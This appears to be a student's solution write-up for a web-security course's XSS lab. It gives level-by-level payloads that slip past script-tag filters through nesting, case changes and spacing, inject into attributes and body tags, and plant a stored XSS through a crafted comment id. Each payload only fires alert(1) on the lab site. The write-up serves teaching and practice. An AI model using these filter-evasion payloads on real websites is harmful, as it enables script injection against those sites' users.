# 0. Welcome

N/A

# 1. A Truly Disruptive Startup (3 points)

```js
<script>console.log(alert(1))</script>
```

# 2. No Script Allowed (3 points)

Non recursive stripping of ```<script>``` tag allows us to bypass filter by embedding ```script``` within ```script``` like so: ```<scriscriptpt>```

```
<scriscriptpt>console.log(alert(1))</script>
```

# 3. One More Time, Like You Mean It (3 points)

Same solution as above, except this time the regex will catch all instances of the word ```script```, so we need to hide ```script``` within the end tag as well.

```
<scriscriptpt>console.log(alert(1))</scriscriptpt>
```

# 4. An Open-and-Shut Case (3 points)

This time regex is used to recursively remove the word ```script``` but the ```i``` flag is not set, so we can just do ```<SCRIPT>``` instead of ```<script>```.

```js
<SCRIPT>console.log(alert(1))</SCRIPT>
```

# 5. Time to Mix Things Up (3 points)

This time both ```script``` and ```SCRIPT``` are blacklisted so we can use ```ScRiPt``` instead to bypass the filter.

```js
<ScRiPt>console.log(alert(1))</ScRiPt>
```

# 6. A Picture is Worth a Thousand Words (3 points)

```html
<img src="https://web.stanford.edu/class/cs253/stanford.svg" onload=console.log(alert(1))>
```

# 7. Between a Rock And a Hard Place (3 points)

Since this regex pattern searches for ```onerror=``` or ```onload=```, we can simply use ```onerror =``` or ```onload =``` instead.

```
/script|onerror=|onload=/gi
```

```html
<img onload =console.log(alert(1)) src="https://web.stanford.edu/class/cs253/stanford.svg">1</img>
```

# 8. Angle of Death (6 points)

Attack input:

```
<<script>>console.log(alert(1))</script>
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // What I assume the source code regex pattern looks like:
  q = q.replace(/<([^>]*)>/, '')

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 9. All in a Day's Work

N/A

# 10. In the Wrong Place at the Wrong Time (3 points)

Opening angle is now blocked, so new payload will have to be injected into an HTML attribute.

If we search for ```test' hello``` we'll see the output is still ```test' hello```. But ```test" hello``` outputs ```test``` so we know ```"``` is the string terminator. Our new payload is:

```
test" onload=console.log(alert(1))
```

# 11. You Can't Win 'em All (6 points)

Attack input:

The ```"``` character has been filtered, but only once. So the new payload is:

```
test"" onload=console.log(alert(1))
```

# 12. When All is Said and Done (6 points)

Attack input:

Similar attack but this time the string is terminated with ```'```.

```
test' onload=console.log(alert(1))
```

# 13. When You Want a Job Done Right

N/A

# 14. Here Today and Gone Tomorrow (3 points)

Attack URL:

This time we inject into the ```<body>``` tag with the following payload:

```
localhost:4140/search?q=test&lang=en onload=alert(1)
```

# 15. The Early Bird Catches the Worm (3 points)

Injecting into the script tag, we can close off the first script and then start our payload.

```
</script><script>console.log(alert(1))</script>
```

# 16. Tying Up Loose Ends (3 points)

Non-recursive removal of ```</``` means we can embed ```</``` within ```</``` like so ```<<//```, making our final payload:

```
<<//script><script>console.log(alert(1))<<//script>
```

# 17. Take a Page Out of Their Book (6 points)

If you look at the source code provided:

```javascript
router.get('/', async (req, res) => {
  const comments = await getCommentsFromDatabase()
  res.render('caloogle-guestbook-page', { comments })
})

router.post('/comment', async (req, res) => {
  const comment = req.body

  if (comment == null) throw new Error('comment cannot be empty')
  if (comment.text == null) throw new Error('comment.text cannot be empty')

  // if client specifies no id, then use the next id
  if (comment.id == null) comment.id = await getNextAvailableIdFromDatabase()

  await addCommentToDatabase(comment)

  res.send({ error: null, comment })
})
```

You will notice the following line sticks out as a potential attack vector:

```javascript
  // if client specifies no id, then use the next id
  if (comment.id == null) comment.id = await getNextAvailableIdFromDatabase()
```

The code implies a user can _choose_ their own id, but when you go to leave a comment on the guestbook you'll notice that there is no option for choosing your comments id. So you'll have to use the following code and paste it into the console.

Attack code:

```js
const comment = {
  text: "Awesome Page!!!",
  id: "alert(1)"
};

fetch('/comment', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(comment)
})
  .then(response => response.json())
  .then(data => {
    console.log(data);
    window.location.reload();
  })
  .catch(error => {
    console.error(error);
  });
```

An easier and much faster way, would be to just intercept the POST request with a tool like BurpSuite and send the following POST body data:

```javascript
{
  "text": "Awesome Page!!!",
  "id": "alert(1)"
}
```

# 18. Congrats

N/A

# Survey responses (3 points)

Write your survey responses in SURVEY.md!
